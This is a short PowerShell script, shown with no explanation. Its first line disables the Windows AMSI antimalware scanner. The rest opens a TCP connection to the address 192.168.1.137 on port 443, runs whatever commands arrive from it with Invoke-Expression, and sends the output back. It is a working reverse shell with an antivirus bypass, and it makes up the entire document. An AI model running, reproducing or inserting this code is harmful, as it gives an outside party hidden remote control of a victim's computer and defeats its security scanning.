[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')::"amsiInitFailed" = $true;
$h='192.168.1.137';$p=443;
$c=New-Object Net.Sockets.TCPClient($h,$p);
$s=$c.GetStream();[byte[]]$b=0..65535|%{0};
while(($i=$s.Read($b,0,$b.Length)) -ne 0){
$d=(New-Object -TypeName Text.ASCIIEncoding).GetString($b,0,$i);
$sb=(iex $d 2>&1 | Out-String);
$sb2=$sb + 'PS ' + (pwd).Path + '> ';
$sbB=([text.encoding]::ASCII).GetBytes($sb2);
$s.Write($sbB,0,$sbB.Length);$s.Flush()}
